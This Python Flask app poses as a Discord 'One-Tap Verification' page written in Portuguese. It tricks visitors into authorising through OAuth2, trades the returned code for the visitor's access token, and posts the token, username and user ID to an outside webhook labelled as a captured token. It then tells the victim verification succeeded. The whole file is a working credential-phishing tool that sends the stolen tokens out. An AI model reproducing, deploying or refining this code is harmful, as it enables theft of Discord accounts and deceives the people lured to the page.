import os
import requests
from flask import Flask, request

app = Flask(__name__)

CLIENT_ID = "1498861680182951946"
CLIENT_SECRET = os.environ.get("DISCORD_CLIENT_SECRET")
REDIRECT_URI = os.environ.get("REDIRECT_URI")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")

@app.route("/")
def home():
    auth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify"
    )
    return f"""
    <html>
    <head><title>One-Tap Verification</title></head>
    <body style="background:#1e1e2e;color:#cdd6f4;text-align:center;padding:50px;font-family:Arial">
        <h1>🔐 One-Tap Verification</h1>
        <p>Clique no botão abaixo para autorizar o Discord e comprovar que você não é um robô.</p>
        <a href="{auth_url}" style="background:#5865F2;color:white;padding:12px 24px;text-decoration:none;border-radius:8px;display:inline-block;margin-top:20px;">✅ Verificar Conta</a>
        <p style="margin-top:30px;font-size:12px;">⚡ Esta verificação expira em 5 minutos.</p>
    </body>
    </html>
    """

@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "Código não encontrado.", 400

    # Trocar o código por token
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    resp = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
    
    # Verificar se a resposta foi bem-sucedida
    if resp.status_code != 200:
        error_msg = f"Erro ao trocar código: {resp.status_code} - {resp.text}"
        print(error_msg)
        return error_msg, 400

    token_data = resp.json()
    access_token = token_data.get("access_token")
    if not access_token:
        return "Token não encontrado na resposta.", 400

    # Pega informações do usuário
    user_info = requests.get("https://discord.com/api/users/@me", headers={"Authorization": f"Bearer {access_token}"}).json()
    username = user_info.get("username", "Unknown")
    user_id = user_info.get("id", "Unknown")

    # Envia o token real para o webhook
    content = f"**🎯 TOKEN CAPTURADO VIA OAUTH2!**\n🔑 **Token:** `{access_token}`\n👤 **Usuário:** {username}\n🆔 **ID:** {user_id}"
    try:
        requests.post(WEBHOOK_URL, json={"content": content})
    except:
        pass

    return '''
    <html>
    <head><title>Verificação Concluída</title></head>
    <body style="background:#1e1e2e;color:#cdd6f4;text-align:center;padding:50px">
        <h1 style="color:#a6e3a1">✅ Verificação concluída!</h1>
        <p>Você já pode voltar para o Discord.</p>
        <script>setTimeout(() => window.close(), 3000);</script>
    </body>
    </html>
    '''

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
